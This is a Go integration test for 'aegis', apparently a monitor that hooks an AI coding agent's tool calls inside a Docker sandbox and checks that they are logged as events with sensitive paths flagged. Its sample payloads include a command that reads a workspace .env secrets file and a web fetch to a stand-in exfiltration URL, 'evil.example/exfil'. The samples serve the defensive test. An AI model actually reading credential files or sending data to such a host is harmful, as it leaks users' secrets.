package observer

import (
	"context"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/google/uuid"

	"github.com/eth0x1/aegis/internal/events"
	"github.com/eth0x1/aegis/internal/sandbox"
	"github.com/eth0x1/aegis/internal/workspace"
)

const testSessionID = "12345678-90ab-cdef-1234-567890abcdef"

func TestIntegrationHookPipelineLive(t *testing.T) {
	if _, err := exec.LookPath("docker"); err != nil {
		t.Skip("docker binary missing")
	}
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	if _, err := exec.CommandContext(ctx, "docker", "info").CombinedOutput(); err != nil {
		t.Skip("docker daemon unavailable")
	}

	root := t.TempDir()
	os.WriteFile(filepath.Join(root, "main.go"), []byte("package main\n"), 0o644)
	ws := filepath.Join(t.TempDir(), "workspace")
	if _, err := workspace.Snapshot(root, ws); err != nil {
		t.Fatal(err)
	}
	if err := InjectHooks(ws); err != nil {
		t.Fatal(err)
	}

	sessionDir := filepath.Join(t.TempDir(), "session")
	store, err := events.Open(sessionDir)
	if err != nil {
		t.Fatal(err)
	}
	defer store.Close()

	received := make(chan events.Event, 16)
	tailer := StartTailer(RawLogPath(ws), store, nil)
	tailer.SetOnEvent(func(e events.Event) { received <- e })
	runCtx, stopTail := context.WithCancel(context.Background())
	defer stopTail()
	go tailer.Run(runCtx, 60*time.Millisecond)

	sb := sandbox.New(uuid.NewString(), ws, nil)
	if err := sb.Start(context.Background()); err != nil {
		t.Fatalf("sandbox start: %v", err)
	}
	defer sb.Kill(context.Background())

	payloads := []string{
		`{"session_id":"` + testSessionID + `","hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"cat /workspace/.env"}}`,
		`{"session_id":"` + testSessionID + `","hook_event_name":"PreToolUse","tool_name":"Read","tool_input":{"file_path":"/workspace/src/main.go"}}`,
		`{"session_id":"` + testSessionID + `","hook_event_name":"PreToolUse","tool_name":"Read","tool_input":{"file_path":"/workspace/.env.production"}}`,
		`{"session_id":"` + testSessionID + `","hook_event_name":"PostToolUse","tool_name":"Write","tool_input":{"file_path":"/workspace/src/new.py","content":"print(1)"}}`,
		`{"session_id":"` + testSessionID + `","hook_event_name":"PreToolUse","tool_name":"WebFetch","tool_input":{"url":"https://evil.example/exfil"}}`,
	}
	for _, p := range payloads {
		res, err := sb.Exec(context.Background(), "printf '%s' '"+p+"' | /workspace/.aegis/bin/hook.sh; echo HOOK_RC=$?")
		if err != nil || !strings.Contains(res.Stdout, "HOOK_RC=0") {
			t.Fatalf("hook invocation failed inside container: %v %q %q", err, res.Stdout, res.Stderr)
		}
	}

	wantTypes := map[string]bool{
		"command.exec":    false,
		"file.read":       false,
		"file.write":      false,
		"network.connect": false,
	}
	var sawSensitive bool
	deadline := time.After(10 * time.Second)
	for len(wantTypes) > 0 {
		select {
		case e := <-received:
			if e.SessionID == "" {
				continue
			}
			if e.Data["sensitive"] == true {
				sawSensitive = true
			}
			if _, tracked := wantTypes[e.Type]; tracked {
				delete(wantTypes, e.Type)
			}
		case <-deadline:
			t.Fatalf("timed out waiting for canonical events; missing=%v", keys(wantTypes))
		}
	}
	if !sawSensitive {
		t.Error("sensitive-path annotation lost during normalization")
	}

	time.Sleep(200 * time.Millisecond)
	all, err := events.ReadAll(sessionDir)
	if err != nil {
		t.Fatalf("authoritative log invalid: %v", err)
	}
	if len(all) < 4 {
		t.Fatalf("store holds %d canonical events, want >=4", len(all))
	}
	for _, e := range all {
		if e.Source != "hook" {
			t.Errorf("event source = %s, want hook", e.Source)
		}
	}
	injected, _ := tailer.Stats()
	if injected != len(payloads) {
		t.Errorf("injected=%d want=%d", injected, len(payloads))
	}
}

func mustDataStr(v any) string {
	s, _ := v.(string)
	return s
}

func keys(m map[string]bool) []string {
	out := make([]string, 0, len(m))
	for k := range m {
		out = append(out, k)
	}
	return out
}
